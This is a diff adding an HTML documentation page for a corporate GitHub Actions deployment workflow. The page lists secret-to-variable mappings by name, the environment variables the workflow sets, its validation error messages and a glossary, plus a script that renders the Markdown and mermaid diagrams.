+| `kube-config` 🔒 | `KUBE_CONFIG` | kubectl apply |
+| `database-jdbc-url` | `DATABASE_JDBC_URL` | Flyway (via env) |
+| `database-schema` | `DATABASE_SCHEMA` | Flyway (via env) |
+| `database-username` | `DATABASE_USERNAME` | Flyway (via env) |
+| `database-password` 🔒 | `DATABASE_PASSWORD` | Flyway (via env) |
+
+### A.3 PRM
+
+| PRM path / key | Env var |
+|---|---|
+| `…/uhg-prod-twistcli-github-actions` `PRISMA-ACCESS-KEY-ID` | `PRISMA_ACCESS_KEY_ID` |
+| `…/uhg-prod-twistcli-github-actions` `PRISMA-SECRET-ACCESS-KEY` | `PRISMA_ACCESS_KEY` |
+
+---
+
+## Appendix B — Environment variable catalogue
+
+Variables the workflow **writes** to `$GITHUB_ENV` (Vault/PRM variables are in Appendix A).
+
+| Variable | Written by (line) | Value / rule | Read by |
+|---|---|---|---|
+| `DEPLOY_WINDOW_DATE_HOUR` | Initialize (L68) | `MMDDYYYY_HH` Central | *(commented-out check)* |
+| `SAFE_ENVIRONMENT` | L78 | `dev\|test\|prod` | Vault paths, image suffix, K8s sed, outputs |
+| `CHECKOUT_REF` | L154 | validated branch name | checkout |
+| `UHG_CA_BASE64` | L166 | base64 CA bundle | Vault action |
+| `SN_CHANGE_TICKET` | L245 | `^[A-Za-z0-9_-]*$` | prod check, ServiceNow, email |
+| `SAFE_BUILD_TYPE` | L272 | allow-listed | outputs |
+| `VALIDATED_DOCKER_IMAGE_TAG` | L293 | `^[A-Za-z0-9._-]*$` | sanitise step |
+| `SAFE_REPOSITORY_NAME` | L352 | caller repo name | image suffix |
+| `SAFE_ARTIFACT_TYPE` | L353 | `ui` / `api` | image suffix |
+| `SAFE_JF_SAAS_DOCKER_NAMESPACE` | L354 | | image suffix |
+| `SAFE_JF_SAAS_CENTRAL_DOCKER_BASE_URL` | L355 | | image URL, JFrog config, login, push, outputs |
+| `SAFE_JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` | L356 | | edge URL, JFrog config, login |
+| `SAFE_DOCKER_IMAGE_TAG` | L357 | | image URLs, outputs |
+| `DOCKER_IMG_SUFFIX_NO_NAMESPACE` | L364 / L372 | `repo/artifact/repo[-dev]` | outputs → promote |
+| `DOCKER_IMAGE_SUFFIX` | L365 / L373 | `ns/repo/artifact/repo[-dev]` | image URLs |
+| `JF_SAAS_CENTRAL_DOCKER_IMAGE_URL` | L380 | push target | build-scan-push `docker-tags` |
+| `JF_SAAS_EDGEINT_DOCKER_IMAGE_URL` | L381 | pull source | K8s `##docker-image-url##` |
+| `JFROG_CLI_LOG_LEVEL` | L405 | `ERROR…TRACE` | JFrog CLI |
+| `PRISMA_ACCESS_KEY_ID`, `PRISMA_ACCESS_KEY` | PRM action (L444) | | build-scan-push |
+
+---
+
+## Appendix C — Error message catalogue
+
+| Message (prefix `FATAL ERROR - `) | Step (line) | Cause | Fix |
+|---|---|---|---|
+| `Invalid ENVIRONMENT input: X` | A2 (L81) | Not dev/test/prod | Use a valid environment. |
+| `test or prod environment deployment should be done only from main branch!` | A3 (L89) | "Use workflow from" ≠ `main` | Re-run from `main`. |
+| `BRANCH override is not allowed for test/prod deployments.` | A5 (L118) | Scheduled run with BRANCH for test/prod | Drop BRANCH. |
+| `Checkout ref is empty after sanitization.` | A5 (L129) | Ref was only CR/LF | Check caller inputs. |
+| `Pull request refs are not allowed: X` | A5 (L135) | PR merge/head ref | Run from a branch. |
+| `Fully qualified refs are not allowed as checkout ref: X` | A5 (L145) | e.g. `refs/tags/v1` | Use a branch name. |
+| `Invalid checkout ref: X` | A5 (L151) | Fails `git check-ref-format` | Rename the branch. |
+| `Invalid DEPLOY_TRIGGERED_BY_SCHEDULE input: X` | C1 (L230) | Not YES/NO | Pass YES or NO. |
+| `Invalid SN_CHANGE_TICKET value: X` | C1 (L241) | Characters outside `A-Za-z0-9_-` | Enter just the ticket ID, e.g. `CHG0123456`. |
+| `Please provide change ticket number when deploying to prod!` | C2 (L250) | Empty ticket in prod | Fill SN_CHANGE_TICKET. |
+| `Only users from deployer GHEC user list are allowed to run the workflow!` | C4 (L262) | Your GitHub ID is not in the Vault list for that env | Ask an admin to add you to `deployers-ghec-user-id-list`. |
+| `Invalid BUILD_TYPE input: X` | D1 (L275) | Not in allow-list | Use Maven/MavenJAR/Flyway/Docker/NodeJS. |
+| `Invalid docker image tag: X` | D2 (L289) | Characters outside `A-Za-z0-9._-` | e.g. `R26.11.25`. |
+| `Invalid character '=' in sanitized value: X` | D3 (L313) | `=` in repo name/artifact/Vault URL | Fix the value (message may be hidden, see §18 #5). |
+| `Sanitized value contains disallowed characters: X` | D3 (L319) | Space or other char | Fix the value / Vault entry. |
+| `Invalid &lt;label> value: X` | D3 (L330) | Fails field regex | Fix the named field. |
+| `Invalid JFrog CLI log level: X` | F (L402) | Bad Vault `jfrog-cli-loglevel` | Set it to ERROR/WARN/INFO/DEBUG/TRACE. |
+
+---
+
+## Glossary
+
+| Term | Meaning |
+|---|---|
+| **ASK ID / AIDE ID** | UHG application identifier (`UHGWM110-027861`), attached to images and Sonar projects. |
+| **BuildKit secret** | A Docker build-time secret mounted for one `RUN` and never stored in a layer. |
+| **Caller workflow** | The small workflow in an app repo that `uses:` this reusable workflow. |
+| **Central / Edge (JFrog)** | Central = SaaS Artifactory where images are pushed. Edge = UHG-internal replica the clusters pull from. |
+| **Change window** | The approved time range on a ServiceNow change during which prod changes are allowed. |
+| **EPL** | Enterprise Pipeline Library: UHG's governed GitHub Actions under `uhg-pipelines/`. |
+| **Expression** | `${{ … }}`, evaluated by GitHub before the step runs. |
+| **GHEC** | GitHub Enterprise Cloud. |
+| **`GITHUB_ENV` / `GITHUB_OUTPUT`** | Special files for passing env vars to later steps, and outputs to later jobs. |
+| **HPA** | HorizontalPodAutoscaler. |
+| **ImagePullBackOff** | K8s pod state when the image cannot be pulled (wrong tag, no credentials). |
+| **Namespace (K8s)** | An isolated area inside a cluster, one per CECT environment. |
+| **ODI-Gov** | CECT's government (state Medicaid) deployment variant. |
+| **OIDC** | OpenID Connect; here, GitHub-issued JWTs used to log in to Vault and JFrog without passwords. |
+| **PRM** | UHG privileged-secret manager that holds Prisma credentials. |
+| **Promotion** | Copying/moving a tested image into the **release** repository. |
+| **Reusable workflow** | A workflow with `on: workflow_call` that other workflows can invoke. |
+| **Runner** | Machine that executes jobs; here the self-hosted `uhg-runner`. |
+| **Self-hosted runner** | A runner operated by UHG inside its network, not by GitHub. |
+| **Sonar quality gate** | Pass/fail thresholds on SonarQube metrics (`targetQG: ADOPTION`). |
+| **twistcli** | Prisma Cloud's command-line scanner. |
+| **Xray** | JFrog's vulnerability and licence scanner. |
+
+---
+
+*End of guide. If you change the workflow, update this document in the same PR. It is only useful while it is true.*
+</textarea>
+<script src="https://cdn.jsdelivr.net/npm/marked@12.0.2/marked.min.js"></script>
+<script type="module">
+  import mermaid from 'https://cdn.jsdelivr.net/npm/mermaid@10.9.1/dist/mermaid.esm.min.mjs';
+
+  const slug = (t) => t.toLowerCase().replace(/<[^>]+>/g, '').replace(/[^\p{L}\p{N}\s_-]/gu, '').trim().replace(/\s/g, '-');
+  const esc = (s) => s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  const tocItems = [];
+
+  marked.use({
+    gfm: true,
+    renderer: {
+      heading(text, level, raw) {
+        const id = slug(raw);
+        if (level === 2 || level === 3) tocItems.push({ id, level, text: raw });
+        return `<h${level} id="${id}">${text}</h${level}>`;
+      },
+      code(code, lang) {
+        if ((lang || '').trim() === 'mermaid') return `<pre class="mermaid">${esc(code)}</pre>`;
+        return `<pre><code class="language-${esc(lang || '')}">${esc(code)}</code></pre>`;
+      },
+    },
+  });
+
+  const md = document.getElementById('md-source').value;
+  const main = document.getElementById('content');
+  main.innerHTML = marked.parse(md);
+
+  // Make relative links to the .md file / html work, open external links in new tab
+  main.querySelectorAll('a[href^="http"]').forEach(a => { a.target = '_blank'; a.rel = 'noopener'; });
+
+  const links = document.getElementById('toc-links');
+  links.innerHTML = tocItems.map(i => `<a class="h${i.level}" href="#${i.id}">${esc(i.text.replace(/`/g, ''))}</a>`).join('');
+  document.getElementById('filter').addEventListener('input', (e) => {
+    const q = e.target.value.toLowerCase();
+    links.querySelectorAll('a').forEach(a => { a.style.display = a.textContent.toLowerCase().includes(q) ? '' : 'none'; });
+  });
+
+  mermaid.initialize({
+    startOnLoad: false, securityLevel: 'loose', theme: 'base',
+    themeVariables: {
+      primaryColor: '#e8f0fe', primaryBorderColor: '#002677', primaryTextColor: '#1f2933',
+      lineColor: '#5b6770', secondaryColor: '#fff1ea', tertiaryColor: '#f4f2ec',
+      fontFamily: '-apple-system, Segoe UI, Roboto, Arial, sans-serif', fontSize: '14px'
+    },
+    flowchart: { htmlLabels: true, curve: 'basis' },
+    sequence: { mirrorActors: false, showSequenceNumbers: false },
+  });
+
+  const nodes = [...document.querySelectorAll('pre.mermaid')];
+  window.__mermaidErrors = [];
+  for (const [i, el] of nodes.entries()) {
+    const code = el.textContent;
+    try {
+      const { svg } = await mermaid.render(`mmd-${i}`, code);
+      el.innerHTML = svg;
+    } catch (err) {
+      window.__mermaidErrors.push({ index: i, firstLine: code.split('\n')[0], message: String(err.message || err) });
+      el.innerHTML = `<div class="mermaid-error">Diagram ${i} failed to render:\n${esc(String(err.message || err))}</div>`;
+      document.getElementById(`dmmd-${i}`)?.remove();
+    }
+  }
+  window.__mermaidDone = true;
+
+  const heads = [...main.querySelectorAll('h2[id], h3[id]')];
+  const navLinks = new Map([...links.querySelectorAll('a')].map(a => [a.getAttribute('href').slice(1), a]));
+  const obs = new IntersectionObserver((entries) => {
+    entries.forEach(en => {
+      if (en.isIntersecting) {
+        navLinks.forEach(a => a.classList.remove('active'));
+        navLinks.get(en.target.id)?.classList.add('active');
+      }
+    });
+  }, { rootMargin: '0px 0px -75% 0px' });
+  heads.forEach(h => obs.observe(h));
+  if (location.hash) document.getElementById(decodeURIComponent(location.hash.slice(1)))?.scrollIntoView();
+</script>
+</body>
+</html>
